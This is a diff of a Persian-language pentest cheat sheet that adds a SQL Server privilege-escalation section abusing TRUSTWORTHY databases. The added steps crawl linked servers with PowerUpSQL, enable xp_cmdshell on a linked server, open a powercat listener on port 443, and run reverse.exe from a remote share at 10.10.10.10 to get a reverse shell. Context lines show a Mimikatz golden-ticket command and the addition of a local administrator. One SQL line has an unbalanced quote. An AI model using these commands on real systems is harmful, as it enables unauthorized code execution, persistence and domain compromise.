@@ -571,6 +571,25 @@ Invoke-SQLOCmd -Verbose -Command “net localgroup administrators user1 /add” 
 2.mimikatz # kerberos::golden /user:<USER> /domain:</DOMAIN> /sid:<OBJECT SECURITY ID> /rce:<NTLM HASH> /id:<USER ID>
 ```
 
+### ارتقا دسترسی با پایگاه داده TRUSTWORTHY در SQL Server
+
+```text
+1. . .\PowerUpSQL.ps1
+2. Get-SQLInstanceLocal -Verbose
+3. (Get-SQLServerLinkCrawl -Verbos -Instance "10.10.10.10" -Query 'select * from master..sysservers').customer.query
+4. 
+USE "master";
+SELECT *, SCHEMA_NAME("schema_id") AS 'schema' FROM "master"."sys"."objects" WHERE "type" IN ('P', 'U', 'V', 'TR', 'FN', 'TF, 'IF');
+execute('sp_configure "xp_cmdshell",1;RECONFIGURE') at "<DOMAIN>\<DATABASE NAME>"
+5. powershell -ep bypass
+6. Import-Module .\powercat.ps1
+7. powercat -l -v -p 443 -t 10000
+8.
+SELECT *, SCHEMA_NAME("schema_id") AS 'schema' FROM "master"."sys"."objects" WHERE "type" IN ('P', 'U', 'V', 'TR', 'FN', 'TF, 'IF');
+execute('sp_configure "xp_cmdshell",1;RECONFIGURE') at "<DOMAIN>\<DATABASE NAME>" 
+execute('exec master..xp_cmdshell "\\10.10.10.10\reverse.exe"') at "<DOMAIN>\<DATABASE NAME>" 
+```
+
 ### ارتقا دسترسی با gdbus
 
 ```text
